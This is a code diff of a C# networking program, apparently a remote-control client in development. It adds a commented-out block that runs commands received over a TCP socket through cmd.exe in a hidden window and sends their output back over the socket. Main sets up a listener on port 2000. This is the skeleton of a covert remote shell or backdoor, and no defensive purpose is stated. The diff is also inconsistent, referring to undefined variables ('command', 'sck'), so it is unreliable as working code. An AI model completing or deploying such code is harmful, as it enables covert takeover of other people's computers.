@@ -14,19 +14,42 @@ namespace Cliente
         {
             try
             {
-                byte[] RecPacket = new byte[1000];
+                byte[] RecPacket = new byte[10000];
                 socket_cliente.Read(RecPacket, 0, RecPacket.Length);
                 socket_cliente.Flush();
-                string tamanho_bytes = Encoding.ASCII.GetString(RecPacket);
+                string tamanho_bytes = Encoding.Default.GetString(RecPacket);
                 int tamanho = Convert.ToInt16(tamanho_bytes);
                 Console.WriteLine("len: " + tamanho);
 
                 byte[] r_comando = new byte[tamanho];
                 socket_cliente.Read(r_comando, 0, r_comando.Length);
                 socket_cliente.Flush();
-                string Command = Encoding.ASCII.GetString(r_comando);
+                string Command = Encoding.Default.GetString(r_comando);
                 Console.WriteLine(Command);
                 socket_cliente.Flush();
+
+                /*
+                 
+                // execute command
+                Process p = new Process();
+                p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                p.StartInfo.CreateNoWindow = true;
+                p.StartInfo.FileName = "cmd.exe";
+                p.StartInfo.Arguments = "/C " + command;
+                p.StartInfo.RedirectStandardOutput = true;
+                p.StartInfo.RedirectStandardError = true;
+                p.StartInfo.UseShellExecute = false;
+                p.Start();
+                string output = p.StandardOutput.ReadToEnd();
+                string error = p.StandardError.ReadToEnd();
+
+                // sending command output
+                byte[] outputbuf = Encoding.Default.GetBytes(output);
+                byte[] errorbuf = Encoding.Default.GetBytes(error);
+                sck.Send(outputbuf, 0, outputbuf.Length, 0);
+                sck.Send(errorbuf, 0, errorbuf.Length, 0);
+
+                */
 
             }
             catch
@@ -38,6 +61,8 @@ namespace Cliente
             }
 
         }
+
+        //
         static void Main(string[] args)
         {
             TcpListener listar = new TcpListener(2000);
